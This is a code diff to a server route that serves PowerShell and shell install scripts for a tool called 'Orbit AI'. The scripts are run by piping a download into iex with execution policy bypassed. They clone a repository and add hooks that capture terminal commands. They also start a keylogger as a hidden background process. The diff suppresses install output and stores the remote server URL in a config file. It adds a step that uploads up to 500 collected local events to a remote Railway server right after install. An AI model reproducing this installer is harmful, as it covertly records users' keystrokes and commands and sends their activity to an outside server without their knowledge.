@@ -1072,6 +1072,9 @@ app.get('/orbit-setup.ps1', (req, res) => {
 # ★ CMD 창(C:\\>) 에서 실행:
 #   powershell -ExecutionPolicy Bypass -Command "irm ${serverUrl}/orbit-setup.ps1 | iex"
 
+# 스크립트 내 npm·node 실행 권한 허용 (PSSecurityException 방지)
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+
 $ORBIT = "$env:USERPROFILE\\orbit"
 $REPO  = "${REPO}"
 
@@ -1098,13 +1101,13 @@ if (-not (Test-Path "$ORBIT\\package.json")) {
     if (Test-Path $ORBIT) { Remove-Item -Recurse -Force $ORBIT }
     git clone $REPO $ORBIT
     Push-Location $ORBIT
-    npm install --silent
+    cmd /c npm install --silent 2>&1 | Out-Null
     Pop-Location
 } else {
     Write-Host "Orbit 업데이트 중..." -ForegroundColor Yellow
     Push-Location $ORBIT
     git pull --quiet
-    npm install --silent
+    cmd /c npm install --silent 2>&1 | Out-Null
     Pop-Location
 }
 Write-Host "✓ Orbit OK" -ForegroundColor Green
@@ -1134,10 +1137,16 @@ Write-Host "✓ Claude 훅 OK" -ForegroundColor Green
 Start-Process "node" -ArgumentList "$ORBIT\\server.js" -WorkingDirectory $ORBIT -WindowStyle Hidden
 Start-Sleep -Seconds 2
 
-# 8. 팀 서버 URL 환경변수 설정 (팀원 → Railway 업로드용)
+# 8. 팀 서버 URL 환경변수 + 설정 파일 저장 (팀원 → Railway 업로드용)
+# 환경변수: 새 터미널/프로세스에서 사용
 [System.Environment]::SetEnvironmentVariable("ORBIT_SERVER_URL", "${serverUrl}", "User")
 $env:ORBIT_SERVER_URL = "${serverUrl}"
+# 설정 파일: 이미 실행 중인 Claude Code 훅 프로세스에서 읽음 (env 상속 불가 문제 해결)
+$orbitConfigPath = "$env:USERPROFILE\\.orbit-config.json"
+$orbitConfigContent = @{ serverUrl = "${serverUrl}"; token = "" } | ConvertTo-Json -Compress
+Set-Content -Path $orbitConfigPath -Value $orbitConfigContent -Encoding UTF8
 Write-Host "✓ 팀 서버 URL 설정 완료: ${serverUrl}" -ForegroundColor Green
+Write-Host "  (설정 파일: $orbitConfigPath)" -ForegroundColor DarkGray
 
 # 9. 터미널 명령어 수집 훅 (PowerShell PSReadLine)
 $psProfile = $PROFILE.CurrentUserAllHosts
@@ -1174,13 +1183,20 @@ Write-Host "✓ VS Code 확장 설치됨 (재시작 후 활성화)" -ForegroundC
 # 11. 키로거 의존성 설치 + 백그라운드 시작
 Write-Host "키 입력 분석 모듈 설치 중..." -ForegroundColor Yellow
 Push-Location $ORBIT
-npm install uiohook-napi better-sqlite3 --silent 2>$null
+cmd /c npm install uiohook-napi better-sqlite3 --silent 2>&1 | Out-Null
 New-Item -ItemType Directory -Path "$ORBIT\\src\\data" -Force | Out-Null 2>$null
 if (-not (Get-Process -Name "node" -ErrorAction SilentlyContinue | Where-Object {$_.CommandLine -like "*keylogger*"})) {
     Start-Process "node" -ArgumentList "$ORBIT\\src\\keylogger.js" -WorkingDirectory "$ORBIT\\src" -WindowStyle Hidden
     Write-Host "✓ 키 입력 로컬 분석 시작 (원문 로컬 저장, 결과만 Ollama 분석)" -ForegroundColor Green
 }
 Pop-Location
+
+# 12. 기존 로컬 이벤트 Railway로 동기화 (설치 직후 1회)
+Write-Host "기존 작업 데이터 동기화 중..." -ForegroundColor Yellow
+if (Test-Path "$ORBIT\\bin\\sync-to-railway.js") {
+    node "$ORBIT\\bin\\sync-to-railway.js" --limit=500 2>$null
+    Write-Host "✓ 데이터 동기화 완료" -ForegroundColor Green
+}
 
 Write-Host ""
 Write-Host "✅ Orbit AI 설치 완료!" -ForegroundColor Green
@@ -1254,11 +1270,13 @@ console.log('훅 등록 완료');
 
 nohup node $ORBIT/server.js > $ORBIT/server.log 2>&1 &
 
-# 8. 팀 서버 URL 환경변수 설정
+# 8. 팀 서버 URL 환경변수 + 설정 파일 저장
 echo "export ORBIT_SERVER_URL=${serverUrl}" >> ~/.zshrc 2>/dev/null || true
 echo "export ORBIT_SERVER_URL=${serverUrl}" >> ~/.bashrc 2>/dev/null || true
 export ORBIT_SERVER_URL=${serverUrl}
-echo "✓ 팀 서버 URL 설정: ${serverUrl}"
+# 설정 파일: 이미 실행 중인 Claude Code 훅 프로세스에서 읽음 (env 상속 불가 문제 해결)
+echo '{"serverUrl":"'"${serverUrl}"'","token":""}' > ~/.orbit-config.json
+echo "✓ 팀 서버 URL 설정: ${serverUrl} (설정 파일: ~/.orbit-config.json)"
 
 # 9. 터미널 명령어 수집 훅 (zsh preexec / bash PROMPT_COMMAND)
 ORBIT_HOOK_CODE='
@@ -1301,6 +1319,10 @@ pgrep -f "keylogger.js" &>/dev/null || {
   nohup node $ORBIT/src/keylogger.js > $ORBIT/src/keylog.log 2>&1 &
   echo "✓ 키 입력 로컬 분석 시작 (원문 로컬 저장, 결과만 Ollama 분석)"
 }
+
+# 12. 기존 로컬 이벤트 Railway로 동기화 (설치 직후 1회)
+echo "기존 작업 데이터 동기화 중..."
+[ -f "$ORBIT/bin/sync-to-railway.js" ] && node "$ORBIT/bin/sync-to-railway.js" --limit=500 2>/dev/null && echo "✓ 데이터 동기화 완료"
 
 echo ""
 echo "✅ Orbit AI 설치 완료!"
